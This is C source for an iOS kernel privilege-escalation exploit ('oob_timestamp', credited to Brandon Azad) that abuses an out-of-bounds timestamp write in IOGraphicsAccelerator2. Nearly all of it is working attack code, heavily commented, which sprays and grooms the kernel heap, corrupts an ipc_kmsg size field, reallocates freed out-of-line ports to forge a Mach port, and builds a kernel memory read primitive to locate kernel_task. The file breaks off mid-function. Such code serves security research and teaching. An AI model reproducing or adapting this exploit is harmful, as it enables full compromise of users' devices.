/*
 * oob_timestamp.c
 * Brandon Azad
 */
#include "oob_timestamp.h"

#include <CoreFoundation/CoreFoundation.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <pthread.h>
#include <stdio.h>
#include <sys/mman.h>

#include "IOKitLib.h"
#include "iosurface.h"
#include "ipc_port.h"
#include "kernel_alloc.h"
#include "kernel_memory.h"
#include "oob_kernel_alloc.h"
#include "oob_kernel_memory.h"
#include "log.h"
#include "mach_vm.h"
#include "oob_parameters.h"
#include "platform.h"


// ---- Exploit tuning ----------------------------------------------------------------------------

// Define this to 1 to enable device memory layout profiling.
#define PROFILE_COMMAND_BUFFER_ADDRESS	0

// Set this value to 48 MB before the average of the minimum and maximum fault addresses observed
// in the panic logs generated when profiling.
uint64_t ADDRESS(fake_port_page) = 0xffffffe18d2e0000;


// ---- IOGraphicsAccelerator2 --------------------------------------------------------------------

const int IOAccelCommandQueue2_type = 4;
const int IOAccelSharedUserClient2_type = 2;
const int IOAccelSharedUserClient2_create_shmem_selector = 5;
const int IOAccelCommandQueue2_set_notification_port_selector = 0;
const int IOAccelCommandQueue2_submit_command_buffers_selector = 1;

struct IOAccelDeviceShmemData {
	void *data;
	uint32_t length;
	uint32_t shmem_id;
};

struct IOAccelCommandQueueSubmitArgs_Header {
	uint32_t field_0;
	uint32_t count;
};

struct IOAccelCommandQueueSubmitArgs_Command {
	uint32_t command_buffer_shmem_id;
	uint32_t segment_list_shmem_id;
	uint64_t notify_1;
	uint64_t notify_2;
};

struct IOAccelSegmentListHeader {
	uint32_t field_0;
	uint32_t field_4;
	uint32_t segment_count;
	uint32_t length;
};

struct IOAccelSegmentResourceList_ResourceGroup {
	uint32_t resource_id[6];
	uint8_t field_18[48];
	uint16_t resource_flags[6];
	uint8_t field_54[2];
	uint16_t resource_count;
};

struct IOAccelSegmentResourceListHeader {
	uint64_t field_0;
	uint32_t kernel_commands_start_offset;
	uint32_t kernel_commands_end_offset;
	int total_resources;
	uint32_t resource_group_count;
	struct IOAccelSegmentResourceList_ResourceGroup resource_groups[];
};

struct IOAccelKernelCommand {
	uint32_t type;
	uint32_t size;
};

struct IOAccelKernelCommand_CollectTimeStamp {
	struct IOAccelKernelCommand command;
	uint64_t timestamp;
};

/*
 * IOAccelSharedUserClient2_create_shmem
 *
 * Description:
 * 	Call IOAccelSharedUserClient2::create_shmem() to create a shared memory region. The maximum
 * 	shared region size on iOS is 96 MB.
 */
static void
IOAccelSharedUserClient2_create_shmem(io_connect_t IOAccelSharedUserClient2, size_t size,
		struct IOAccelDeviceShmemData *shmem) {
	assert(shmem != NULL);
	size_t out_size = sizeof(*shmem);
	uint64_t shmem_size = size;
	kern_return_t kr = IOConnectCallMethod(IOAccelSharedUserClient2,
			IOAccelSharedUserClient2_create_shmem_selector,
			&shmem_size, 1,
			NULL, 0,
			NULL, NULL,
			shmem, &out_size);
	assert(kr == KERN_SUCCESS);
}

/*
 * IOAccelCommandQueue2_set_notification_port
 *
 * Description:
 * 	Call IOAccelCommandQueue2::set_notification_port() to set a notification port. This is
 * 	required before IOAccelCommandQueue2::submit_command_buffers() can be called.
 */
static void
IOAccelCommandQueue2_set_notification_port(io_connect_t IOAccelCommandQueue2,
		mach_port_t notification_port) {
	kern_return_t kr = IOConnectCallAsyncMethod(IOAccelCommandQueue2,
			IOAccelCommandQueue2_set_notification_port_selector,
			notification_port,
			NULL, 0,
			NULL, 0,
			NULL, 0,
			NULL, NULL,
			NULL, NULL);
	assert(kr == KERN_SUCCESS);
}

/*
 * IOAccelCommandQueue2_submit_command_buffers
 *
 * Description:
 * 	Call IOAccelCommandQueue2::submit_command_buffers(). The submit_args should describe the
 * 	command buffer and segment list for each command.
 */
static void
IOAccelCommandQueue2_submit_command_buffers(io_connect_t IOAccelCommandQueue2,
		const struct IOAccelCommandQueueSubmitArgs_Header *submit_args,
		size_t size) {
	kern_return_t kr = IOConnectCallMethod(IOAccelCommandQueue2,
				 IOAccelCommandQueue2_submit_command_buffers_selector,
				 NULL, 0,
				 submit_args, size,
				 NULL, NULL,
				 NULL, NULL);
	assert(kr == KERN_SUCCESS);
}

// ---- Exploit functions -------------------------------------------------------------------------

#define KB	(1024uLL)
#define MB	(1024uLL * KB)
#define GB	(1024uLL * MB)

/*
 * for_each_page
 *
 * Description:
 * 	Iterate through pages in a data region. It is assumed that the address passed is the start
 * 	of the first page. The callback is invoked with the address of each page and its index.
 */
static void
for_each_page(void *data, size_t size, void (^callback)(void *page, size_t index, bool *stop)) {
	size_t count = size / page_size;
	bool stop = false;
	for (size_t i = 0; i < count && !stop; i++) {
		callback(data, i, &stop);
		data = (uint8_t *) data + page_size;
	}
}

/*
 * fail
 *
 * Description:
 * 	Abort the exploit.
 */
static void _Noreturn
fail() {
	usleep(100000);
	exit(1);
}

// ---- Exploit -----------------------------------------------------------------------------------

void
oob_timestamp_pwn(uint64_t* kernel_base_out) {
	// Test if we already have a kernel task port.
	mach_port_t host = mach_host_self();
//	host_get_special_port(host, 0, 4, &kernel_task_port);
//	if (MACH_PORT_VALID(kernel_task_port)) {
//		INFO("tfp0: 0x%x", kernel_task_port);
//		struct task_dyld_info info;
//		mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
//		task_info(kernel_task_port, TASK_DYLD_INFO, (task_info_t) &info, &count);
//		INFO("kernel base: 0x%016llx", info.all_image_info_addr);
//		return;
//	}
    
    // Get general platform info.
    platform_init();
    
	// Check that this platform is supported.
	INFO("Platform: %s %s", platform.machine, platform.osversion);
	bool ok = oob_parameters_init();
	if (!ok) {
		fail();
	}

	INFO("[%llx] oob_timestamp", mach_absolute_time());

	// 1. Open the IOAccelCommandQueue2 and IOAccelSharedUserClient2 user clients.
	io_service_t IOGraphicsAccelerator2 = IOServiceGetMatchingService(kIOMasterPortDefault,
			IOServiceMatching("IOGraphicsAccelerator2"));
	assert(IOGraphicsAccelerator2 != IO_OBJECT_NULL);
	io_connect_t IOAccelCommandQueue2 = IO_OBJECT_NULL;
	IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
			IOAccelCommandQueue2_type, &IOAccelCommandQueue2);
	assert(IOAccelCommandQueue2 != IO_OBJECT_NULL);
	io_connect_t IOAccelSharedUserClient2 = IO_OBJECT_NULL;
	IOServiceOpen(IOGraphicsAccelerator2, mach_task_self(),
			IOAccelSharedUserClient2_type, &IOAccelSharedUserClient2);
	assert(IOAccelSharedUserClient2 != IO_OBJECT_NULL);

	// 2. Initialize IOSurface.
	ok = IOSurface_init();
	assert(ok);
	uint32_t iosurface_property = 0;

	// 3. Connect the IOAccelCommandQueue2 to IOAccelSharedUserClient2.
	kern_return_t kr = IOConnectAddClient(IOAccelCommandQueue2, IOAccelSharedUserClient2);
	assert(kr == KERN_SUCCESS);

	// 4. Allocate 200 holding ports. Only about 29 will be used.
	struct holding_port_array holding_ports = holding_ports_create(200);
	struct holding_port_array all_holding_ports = holding_ports;

	// 5. Create the command buffer and segment list. Each is of size 96 MB, which is the
	// maximum size of an IOKit pageable map allowed by XNU's IOIteratePageableMaps(). The
	// shared memory regions will only be mapped into the kernel on the first call to
	// IOAccelCommandQueue2::submit_command_buffers().
	const uint32_t command_buffer_size = 96 * MB;
	const uint32_t segment_list_size = 96 * MB;
	// Create the command buffer.
	struct IOAccelDeviceShmemData command_buffer_shmem;
	IOAccelSharedUserClient2_create_shmem(IOAccelSharedUserClient2,
			command_buffer_size, &command_buffer_shmem);
	void *command_buffer = command_buffer_shmem.data;
	// Create the segment list.
	struct IOAccelDeviceShmemData segment_list_shmem;
	IOAccelSharedUserClient2_create_shmem(IOAccelSharedUserClient2,
			segment_list_size, &segment_list_shmem);
	void *segment_list = segment_list_shmem.data;
	// Wire down the command buffer and segment list. This does not ensures that accessing
	// these pages from the kernel won't fault.
	mlock(command_buffer, command_buffer_size);
	mlock(segment_list, segment_list_size);

	// 6. Register a notification port for the IOAccelCommandQueue2. No need to listen on it
	// (keep that infoleak well hidden!).
	mach_port_t notification_port = holding_port_grab(&holding_ports);
	IOAccelCommandQueue2_set_notification_port(IOAccelCommandQueue2, notification_port);

	// 7. Set up the arguments to IOAccelCommandQueue2::submit_command_buffers().
	struct {
		struct IOAccelCommandQueueSubmitArgs_Header header;
		struct IOAccelCommandQueueSubmitArgs_Command command;
	} submit_args = {};
	submit_args.header.count = 1;
	submit_args.command.command_buffer_shmem_id = command_buffer_shmem.shmem_id;
	submit_args.command.segment_list_shmem_id   = segment_list_shmem.shmem_id;
	// Segment list header.
	struct IOAccelSegmentListHeader *slh = (void *) segment_list;
	slh->length = 0x100;
	slh->segment_count = 1;
	struct IOAccelSegmentResourceListHeader *srlh = (void *)(slh + 1);
	srlh->kernel_commands_start_offset = 0;
	srlh->kernel_commands_end_offset = command_buffer_size;
	// CollectTimeStamp command 1 is located at the beginning of the command buffer and skips
	// to the end of the buffer. After calling IOAccelCommandQueue2::submit_command_buffers(),
	// the first of the two timestamps is written to ts_cmd_1->timestamp.
	struct IOAccelKernelCommand_CollectTimeStamp *ts_cmd_1 = (void *)command_buffer_shmem.data;

	// 8. This function will set up the out-of-bounds timestamp write to write the specified
	// number of bytes past the end of the command buffer.
	void (^init_out_of_bounds_timestamp_write_size)(size_t) = ^(size_t overflow_size) {
		assert(0 <= overflow_size && overflow_size <= 8);
		// Make the first CollectTimeStamp command skip to the end of the buffer, leaving
		// enough space for a full timestamp command minus the amount we want to overflow.
		size_t ts_cmd_1_size = command_buffer_size - (sizeof(*ts_cmd_1) - overflow_size);
		ts_cmd_1->command.type = 2;
		ts_cmd_1->command.size = (uint32_t) ts_cmd_1_size;
		// CollectTimeStamp command 2 writes the timestamp past the end of the buffer. The
		// function IOAccelCommandQueue2::processSegmentKernelCommand() excludes the length
		// of the 8-byte header when verifying that the entire command is within the bounds
		// of the command buffer.
		// command
		// exclude the size of the IOAccelKernelCommand header
		// even though the timestamp part of it is out-of-bounds.
		void *next = ((uint8_t *) ts_cmd_1 + ts_cmd_1->command.size);
		struct IOAccelKernelCommand_CollectTimeStamp *ts_cmd_2 = next;
		ts_cmd_2->command.type = 2;
		ts_cmd_2->command.size = sizeof(*ts_cmd_1) - 8;
	};

	// TODO: Separate kmem_alloc() spray with larger element size for padding out the kfree()
	// region.

	// 9. Prepare the IOSurface kmem_alloc() spray for padding out the kfree() region and for
	// reallocating the out-of-line ports. We can use the rest of the segment list buffer as
	// scratch space for this.
	//
	// TODO: For now, we'll use a static address for our fake port. This value works on my
	// factory-reset iPhone12,3 64GB on iOS 13.3 17C54 when run about 30 seconds after boot
	// with no other apps launched. It will vary widely depending on your exact device and what
	// processes are running. To get a sense of what value to use, you can define
	// PROFILE_COMMAND_BUFFER_ADDRESS below.
	uint64_t fake_port_offset = 0x100;
	uint64_t fake_port_address = ADDRESS(fake_port_page) + fake_port_offset;
	void *ool_ports_reallocation_array_buffer = (uint8_t *) segment_list + page_size;
	size_t ool_ports_reallocation_array_buffer_size = segment_list_size - page_size;
	ok = IOSurface_kmem_alloc_array_fast_prepare_(
			16 * page_size,		// Each kmem_alloc() is 16 pages
			80 * MB,		// Spray 80 MB
			ool_ports_reallocation_array_buffer,		// The buffer to use
			&ool_ports_reallocation_array_buffer_size,	// The size of the buffer
			^(void *data, size_t index) {			// Initialization callback
		// Place a fake Mach port pointer as the first item in the fake OOL ports array.
		*(uint64_t *)(data + 8 * page_size) = fake_port_address;
	});
	if (!ok) {
		ERROR("Failed to prepare OOL ports reallocation spray");
		fail();
	}

	// 10. Allocate 120 MB of 7-page kalloc allocations for a kalloc fragmentation. Put at most
	// 10 MB in each port. We want to fill the kalloc_map and start allocating from the
	// kernel_map near the middle of this spray.
	//
	// --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
	//   |  zalloc map  |     kalloc map  | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 | 7 |
	// --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
	struct ipc_kmsg_kalloc_fragmentation_spray fragmentation_spray;
	ipc_kmsg_kalloc_fragmentation_spray_(&fragmentation_spray,
			7 * page_size,		// 7-page kalloc allocations
			120 * MB,		// 120 MB total spray
			10 * MB,		// 10 MB per port
			&holding_ports);

	// 11. Free 30 MB of the fragmentation spray from each end. This should create enough free
	// space in both the kalloc_map and the kernel_map to satisfy most allocations smaller than
	// 8 pages.
	//
	// --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
	//   |  zalloc map  |     kalloc map  | 7 |   | 7 |   | 7 | 7 | 7 |   | 7 |   | 7 |
	// --#==============#=================+===+===+===+===#---+---+---+---+---+---+---+--------
	ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, +1);
	ipc_kmsg_kalloc_fragmentation_spray_fragment_memory_(&fragmentation_spray, 30 * MB, -1);

	// 12. Allocate 200 MB of 8-page kalloc allocations. This should be enough to fill any
	// remaining 8-page holes in the kalloc_map and kernel_map and start allocating from fresh
	// VA space in the kernel_map.
	//
	// -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
	//  |   | 7 |   | 7 | 8  | old alloc | 8  | 8  | 8  | 8  | 8  | 8  |     fresh VA space ->
	// -+---+---+---+---+----+-----------+----+----+----+----+---------+-----------------------
	struct ipc_kmsg_kalloc_spray kalloc_8page_spray;
	ipc_kmsg_kalloc_spray_(&kalloc_8page_spray,
			NULL,			// Zero-fill the message data.
			8 * page_size,		// 8-page kalloc allocations.
			200 * MB,		// 200 MB total spray.
			0,			// Max spray size per port.
			&holding_ports);

	// 13. Create an 82 MB kalloc allocation in the kernel_map. This serves two purposes:
	// First, when we later spray kmem_alloc allocations to pad the over-freed region and then
	// again to reallocate the freed OOL ports array, we'll need a hole in which the kernel can
	// map in the 80 MB data blob needed to produce that spray. Second, in order to avoid
	// triggering a "kfree: size %u > kalloc_largest_allocated" panic when freeing the
	// corrupted ipc_kmsg, we also need to actually perform a kalloc allocation larger than the
	// maximum possible kfree() size that could result from destroying the corrupted ipc_kmsg.
	//
	// ----------------------------+-----------------+-----------------------------------------
	//  <- all 8 page holes filled |   huge kalloc   |                       fresh VA space ->
	// ----------------------------+-----------------+-----------------------------------------
	//                                    82 MB
	uint32_t huge_kalloc_key = IOSurface_property_key(iosurface_property++);
	ok = IOSurface_kalloc_fast(huge_kalloc_key, 82 * MB);
	if (!ok) {
		ERROR("Could not allocate huge kalloc IOSurface buffer");
		fail();
	}

	// 14. Allocate the IOKit pageable memory regions via XNU's IOIteratePageableMaps(). The
	// maximum size of an IOKit pageable map is 96 MB, so creating a command buffer and segment
	// list each of size 96 MB will ensure that they are each allocated to their own pageable
	// map. This both maximizes the space available for shared memory address prediction and
	// ensures that the out-of-bounds write off the end of the command buffer will fall into
	// the next adjacent memory region.
	//
	// ---------------+-----------------+------------------+------------------+----------------
	//  <- 8PG filled |   huge kalloc   |   segment list   |  command buffer  |
	// ---------------+-----------------+------------------+------------------+----------------
	//                       82 MB             96 MB              96 MB
	extern uint64_t mach_absolute_time(void);
	init_out_of_bounds_timestamp_write_size(0);
#if PROFILE_COMMAND_BUFFER_ADDRESS
	init_out_of_bounds_timestamp_write_size(8);
#endif
	IOAccelCommandQueue2_submit_command_buffers(IOAccelCommandQueue2,
			&submit_args.header, sizeof(submit_args));

	// 15. Allocate a single 8-page ipc_kmsg and store it in a holding port. This ipc_kmsg
	// should fall directly after the command buffer pageable map.
	//
	// ------------------+------------------+-----------+--------------------------------------
	//    segment list   |  command buffer  | ipc_kmsg  |
	// ------------------+------------------+-----------+--------------------------------------
	//        82 MB             96 MB           8 PG
	mach_port_t corrupted_kmsg_port = holding_port_pop(&holding_ports);
	ipc_kmsg_kalloc_send_one(corrupted_kmsg_port, 8 * page_size);

	// 16. Allocate a single 8-page array of out-of-line ports descriptors.
	//
	// Ideally we'd allocate more than one array of out-of-line ports. However, these arrays
	// are allocated with kalloc() which sets the KMA_ATOMIC flag, meaning they cannot be only
	// partially freed. Each additional array of out-of-line ports would bump up the minimum
	// free size, which means we'd need to allocate even more kfree() buffer memory.
	//
	// ------------------+------------------+-----------+-----------+--------------------------
	//    segment list   |  command buffer  | ipc_kmsg  | ool ports |
	// ------------------+------------------+-----------+-----------+--------------------------
	//        82 MB             96 MB           8 PG        8 PG
	size_t ool_port_count = (7 * page_size) / sizeof(uint64_t) + 1;
	mach_port_t ool_ports_msg_holding_port = holding_port_pop(&holding_ports);
	ok = ool_ports_send_one(ool_ports_msg_holding_port,
		NULL,				// Use MACH_PORT_NULL for every port
		ool_port_count,			// Enough ports to just spill onto 8 pages
		MACH_MSG_TYPE_MOVE_RECEIVE,	// Get a receive right
		256);				// Send a message of size 256.
	if (!ok) {
		ERROR("Failed to send out-of-line Mach ports");
		fail();
	}

	// 17. Free the kalloc placeholder. This creates a hole into which the XML data blob for
	// the following spray can be mapped. There is also about 2 MB of slack (for no particular
	// reason).
	//
	// --------+-----------------+-----------+-----------+------+------+-----------------------
	//  <- 8PG |                 |  seglist  |  cmdbuf   | kmsg | ool  |
	// -filled-+-----------------+-----------+-----------+------+------+-----------------------
	//                82 MB          96 MB       96 MB     8 PG   8 PG
	IOSurface_remove_property(huge_kalloc_key);

	// 18. In order to avoid triggering a "vm_map_delete(...): hole after %p" panic, we need to
	// ensure that the next 80 MB (0x05000000 bytes) after the OOL ports array are allocated.
	// Furthermore, this memory cannot be allocated with kalloc(), since kalloc() sets the
	// KMA_ATOMIC flag (which means that the allocation cannot be partially freed, as will
	// probably happen when we destroy the corrupted ipc_kmsg). Thus, we will spray
	// kmem_alloc() allocations using IOSurface.
	//
	// (Ideally we'd directly allocate an 80 MB kmem_alloc() buffer to avoid the step below,
	// but this is larger than the maximum size possible using the OSUnserializeBinary() API.)
	//
	// What we spray isn't important, all we need to do is ensure that all additional
	// memory that might be kfree()d is allocated with kmem_alloc() allocations.
	//
	// --------+-----------------+-----------+-----------+------+------+--+--+--+--+--+--------
	//  <- 8PG | [80 MB XML map] |  seglist  |  cmdbuf   | kmsg | ool  | kfree buffer |
	// -filled-+-----------------+-----------+-----------+------+------+--+--+--+--+--+--------
	//                82 MB          96 MB       96 MB     8 PG   8 PG      80 MB
	uint32_t kfree_buffer_key = IOSurface_property_key(iosurface_property++);
	ok = IOSurface_kmem_alloc_array_fast(kfree_buffer_key,
			ool_ports_reallocation_array_buffer,	// The pre-initialized buffer
			ool_ports_reallocation_array_buffer_size);	// The size
	if (!ok) {
		ERROR("Could not allocate kfree region buffer");
		fail();
	}

	// 19. We will use the out-of-bounds timestamp write to overwrite the ipc_kmsg's ikm_size
	// field with a value in the range [0x0003ffa9, 0x0400a8ff]. In order to control the value
	// written, we need to do some math.
	//
	// We assume that the timestamp will change by at most 0x10000 between when we call
	// mach_absolute_time() in userspace and when the timestamp is written over ikm_size. This
	// bound is highly conservative: in practice it rarely changes more than 0x1000, and is
	// often closer to 0x300. Furthermore, it's easy to test whether this assumption was
	// violated and redo the out-of-bounds write if necessary, so the exact tolerance value is
	// not critical.
	//
	// ikm_size is 4 bytes and immediately followed by 4 bytes of padding, so we can safely
	// overflow past ikm_size without worrying about corrupting anything.
	size_t (^compute_overflow_size_for_timestamp)(uint64_t) = ^size_t(uint64_t ts) {
		//           [___+____]                       [___+____] [0003ffa9, 0400a8ff]
		if (0x000000000003ffa8 < ts && ts <= 0x0000000003ffa8ff) {
			return 8;
		}
		//         [_____+__]                       [_____+__]   [0003ffa9, 03ffa9ff]
		if (0x0000000003ffa8ff < ts && ts <= 0x00000003ffa8ffff) {
			return 7;
		}
		//       [_______+]                       [_______+]     [0003ffa9, 03ffa900]
		if (0x00000003ffa8ffff < ts && ts <= 0x000003ffa8ffffff) {
			return 6;
		}
		//     [________]+                      [________]+      [0003ffa9, 03ffa900]
		if (0x000003ffa8ffffff < ts && ts <= 0x0003ffa8ffffffff) {
			return 5;
		}
		//   [________]  +                    [________]  +      [0003ffa9, 03ffa900]
		if (0x0003ffa8ffffffff < ts && ts <= 0x03ffa8ffffffffff) {
			return 4;
		}
		// [00______]    +                  [00______]    +      [0003ffa9, 00ffffff]
		if (0x03ffa8ffffffffff < ts && ts <= 0xfffffffffffeffff) {
			return 3;
		}
		// If the timestamp is too small, then there is no value we can use to increase the
		// value of ikm_size. If the timestamp is too large, then we risk it wrapping
		// before we can overwrite ikm_size.
		assert(ts <= 0x000000000003ffa8 || ts > 0xfffffffffffeffff);
		return 0;
	};
	// We also define a function that checks if an upper bound on the timestamp suggests that
	// the overflow_size used was okay.
	bool (^check_overflow_size_for_timestamp)(uint64_t, size_t) = ^bool(uint64_t ts, size_t overflow_size) {
		assert(3 <= overflow_size && overflow_size <= 8);
		// If overflow_size is 3, then drop the lower 5 bytes from the timestamp.
		uint32_t ipc_kmsg_size = (uint32_t) (ts >> (8 * (8 - overflow_size)));
		assert(0x0003ffa9 <= ipc_kmsg_size);	// This should always be true.
		return (0x0003ffa9 <= ipc_kmsg_size && ipc_kmsg_size <= 0x0400a8ff);
	};

	// 20. Trigger the OOB write to corrupt the size of the ipc_kmsg directly after the command
	// buffer. We bump ikm_size from 0x0001ffa8 to between 0x0003ffa9 and 0x0400a8ff, which
	// means that when the ipc_kmsg is freed, at least 16 pages will be deallocated (taking out
	// both the original ipc_kmsg allocation and the OOL ports array directly following).
	//
	// -+------------------+-----------+-----------+-----------------+-----------------+-------
	//  |  command buffer  XX ipc_kmsg | ool ports |   kfree buf 1   |   kfree buf 2   |  ...
	// -+------------------+-----------+-----------+-----------------+-----------------+-------
	//                     |-ikm_size--------------------------------------->|
	size_t overflow_size = 0;
retry_overflow:
	overflow_size = compute_overflow_size_for_timestamp(mach_absolute_time());
	if (overflow_size == 0) {
		sleep(1);
		goto retry_overflow;
	}
	init_out_of_bounds_timestamp_write_size(overflow_size);
	IOAccelCommandQueue2_submit_command_buffers(IOAccelCommandQueue2,
			&submit_args.header, sizeof(submit_args));
	ok = check_overflow_size_for_timestamp(mach_absolute_time(), overflow_size);
	if (!ok) {
		INFO("Retrying corruption...");
		goto retry_overflow;
	}
	INFO("Corrupted ipc_kmsg ikm_size");

	// 21. Destroy the port containing the corrupted ipc_kmsg to free the OOL ports array.
	//
	//                      [ ipc_kmsg] [ool ports] [  kfree buf 1  ] [ kfree]
	// -+------------------v-----------v-----------v-----------------v-------+---------+-------
	//  |  command buffer  |                                                 | buf 2   |  ...
	// -+------------------+-------------------------------------------------+---------+-------
	//                     |-ikm_size--------------------------------------->|
	mach_port_destroy(mach_task_self(), corrupted_kmsg_port);
	INFO("Freed the OOL ports");

	// 22. Reallocate the out-of-line ports with controlled data. This needs to be done using
	// kmem_alloc() to avoid tripping KMA_ATOMIC, since receiving the out-of-line ports will
	// cause them to be freed with kfree().
	//
	//                      [ ipc_kmsg] [ool ports] [  kfree buf 1  ] [ kfree]
	// -+------------------v-----------v-----------v-----------------v-----+-+---------+-------
	//  |  command buffer  |        fake ool ports |        fake ool ports | | buf 2   |  ...
	// -+------------------+-----------------------+-----------------------+-+---------+-------
	//                     |-ikm_size--------------------------------------->|
	uint32_t ool_ports_reallocation_key = IOSurface_property_key(iosurface_property++);
	ok = IOSurface_kmem_alloc_array_fast(ool_ports_reallocation_key,
			ool_ports_reallocation_array_buffer,	// The pre-initialized buffer
			ool_ports_reallocation_array_buffer_size);	// The size
	if (!ok) {
		ERROR("Could not reallocate OOL ports");
		fail();
	}
	INFO("Reallocated OOL ports");

	// 23. Reallocating the OOL ports was our last act of kernel heap manipulation, so go ahead
	// and destroy all the holding ports. This won't destroy the ool_ports_msg_holding_port.
	holding_ports_destroy(all_holding_ports);

	// 24. Fault all the pages of the command buffer. If we don't do this, then trying to
	// access the command buffer will panic, because the first access is trying to take a lock
	// with preemption disabled, which means vm_fault() will bail. Wiring the memory above does
	// not ensure that accessing the pages from the kernel won't panic.
	void (^init_fake_port)(void *) = ^(void *page) {
		uint8_t *page_data = page;
		*(uint16_t *) (page_data + 0x16) = 42;
		uint8_t *port = page_data + fake_port_offset;
		FIELD(port, oob_ipc_port, ip_bits, uint32_t) = io_makebits(1, IOT_PORT, IKOT_NONE);
	};
	for_each_page(command_buffer, command_buffer_size,
			^(void *page, size_t index, bool *stop) {
		// Place a CollectTimeStamp command at the start of the page. It will collect the
		// timestamp and then skip to the next page, or to the end of this page if this is
		// the last page.
		struct IOAccelKernelCommand_CollectTimeStamp *ts_cmd = page;
		bool end = (index == (command_buffer_size / page_size) - 1);
		ts_cmd->command.type = 2;
		ts_cmd->command.size = (uint32_t) page_size - (end ? sizeof(*ts_cmd) : 0);
		// Place a fake Mach port on every page.
		init_fake_port(page);
	});
	for_each_page(segment_list, segment_list_size,
			^(void *page, size_t index, bool *stop) {
		// Place a fake Mach port on every page but the first (since that would corrupt the
		// segment list header).
		if (index > 0) {
			init_fake_port(page);
		}
	});
	IOAccelCommandQueue2_submit_command_buffers(IOAccelCommandQueue2,
			&submit_args.header, sizeof(submit_args));

	// 25. Receive the out-of-line ports. This gives us a receive right to the fake port inside
	// the command buffer (or possibly the segment list).
	//
	// Receiving the fake out-of-line ports also truncates one of the kmem_alloc() buffers we
	// sprayed.
	//
	//                      [ ipc_kmsg] [ool ports] [  kfree buf 1  ] [ kfree]
	//                                [e ool ports]
	// -+------------------v-----------v-----------v-----------------v-----+-+---------+-------
	//  |  command buffer  |        fak|           |        fake ool ports | | buf 2   |  ...
	// -+------------------+-----------------------+-----------------------+-+---------+-------
	//                     |-ikm_size--------------------------------------->|
	__block mach_port_t fake_port = MACH_PORT_NULL;
	ool_ports_receive(&ool_ports_msg_holding_port, 1,
			^(mach_port_t *ool_ports, size_t count) {
		// We expect the first port to be the fake port. Save it and remove it from the
		// array so that it doesn't get destroyed.
		fake_port = ool_ports[0];
		ool_ports[0] = MACH_PORT_NULL;
	});
	if (!MACH_PORT_VALID(fake_port)) {
		ERROR("Did not receive fake_port");
		fail();
	}
	INFO("Received fake port 0x%x", fake_port);

	// 26. Give ourselves a send right to the port.
	mach_port_insert_send_right(fake_port);

	// 27. Identify the fake port inside the buffer by looking for a page with a fake port that
	// now has an initialized ip_receiver field. The value of this field is the current task's
	// ipc_space.
	__block uint8_t *fake_port_data = NULL;
	__block uint64_t current_ipc_space = 0;
	// Check both buffers, just in case.
	void *buffer_candidates[2] = { command_buffer, segment_list };
	size_t buffer_candidate_sizes[2] = { command_buffer_size, segment_list_size };
	const char *buffer_candidate_names[2] = { "command buffer", "segment list" };
	for (unsigned i = 0; current_ipc_space == 0 && i < 2; i++) {
		void *buffer = buffer_candidates[i];
		size_t buffer_size = buffer_candidate_sizes[i];
		const char *buffer_name = buffer_candidate_names[i];
		// Check each page to see if it contains the port.
		for_each_page(buffer, buffer_size, ^(void *page, size_t index, bool *stop) {
			uint8_t *port = (uint8_t *) page + fake_port_offset;
			uint64_t ip_receiver = FIELD(port, oob_ipc_port, ip_receiver, uint64_t);
			if (ip_receiver != 0) {
				// Found the port!
				fake_port_data = port;
				current_ipc_space = ip_receiver;
				*stop = true;
				INFO("Found fake port in %s at offset 0x%08zx",
						buffer_name, port - (uint8_t *) buffer);
			}
		});
	}
	if (fake_port_data == NULL) {
		ERROR("Could not find fake port in shared memory regions");
		fail();
	}
	INFO("ipc_space: 0x%016llx", current_ipc_space);

	// 28. Construct a kernel memory read primitive using the fake port.
	size_t fake_task_address = fake_port_address + page_size;
	uint8_t *fake_task_data = fake_port_data + page_size;
	uint8_t *fake_task_page = fake_task_data - (fake_task_address & (page_size - 1));
	*(uint16_t *) (fake_task_page + 0x16) = 57;
	// Read a 32-bit value using pid_for_task().
	uint32_t (^stage0_read32)(uint64_t) = ^uint32_t(uint64_t address) {
		uint64_t fake_proc_address = address - OFFSET(oob_proc, p_pid);
		FIELD(fake_task_data, oob_task, ref_count, uint32_t) = 2;
		FIELD(fake_task_data, oob_task, bsd_info,  uint64_t) = fake_proc_address;
		FIELD(fake_port_data, oob_ipc_port, ip_bits,    uint32_t) = io_makebits(1, IOT_PORT, IKOT_TASK);
		FIELD(fake_port_data, oob_ipc_port, ip_kobject, uint64_t) = fake_task_address;
		int32_t pid = -1;
		kern_return_t kr = pid_for_task(fake_port, &pid);
		if (kr != KERN_SUCCESS) {
			ERROR("Failed to read address 0x%016llx", address);
			fail();
		}
		return pid;
	};
	// Read a 64-bit value using stage0_read32().
	uint64_t (^stage0_read64)(uint64_t) = ^uint64_t(uint64_t address) {
		union {
			uint32_t value32[2];
			uint64_t value64;
		} u;
		u.value32[0] = stage0_read32(address);
		u.value32[1] = stage0_read32(address + 4);
		return u.value64;
	};

	// 29. Grab our task port pointer.
	uint64_t current_task = stage0_read64(current_ipc_space + OFFSET(oob_ipc_space, is_task));

	// 30. Walk the proc list until we find the kernproc.
	uint64_t current_proc = stage0_read64(current_task + OFFSET(oob_task, bsd_info));
	uint64_t kernproc = 0;
	for (uint64_t proc = current_proc;;) {
		if (proc == 0) {
			break;
		}
		int pid = stage0_read32(proc + OFFSET(oob_proc, p_pid));
		if (pid == 0) {
			kernproc = proc;
			break;
		}
		proc = stage0_read64(proc + OFFSET(oob_proc, p_list_next));
	}

	// 31. Grab the kernel_task, kernel_map, and ipc_space_kernel.
	uint64_t kernel_task = stage0_read64(kernproc + OFFSET(oob_proc, task));
	uint64_t kernel_map = stage0_read64(kernel_task + OFFSET(oob_task, map));
	uint64_t current_task_port = stage0_read64(current_task + OFFSET(oob_task, itk_sself));
	uint64_t ipc_space_kernel = stage0_read64(current_task_port + OFFSET(oob_ipc_port, ip_receiver));

	// 32. Convert our fake port into a fake kernel_task.
	void (^build_fake_kernel_task)(void *) = ^(void *fake_task) {
		FIELD(fake_task, oob_task, lck_mtx_data, uint64_t) = 0;
		FIELD(fake_task, oob_task, lck_mtx_type, uint8_t)  = 0x22;
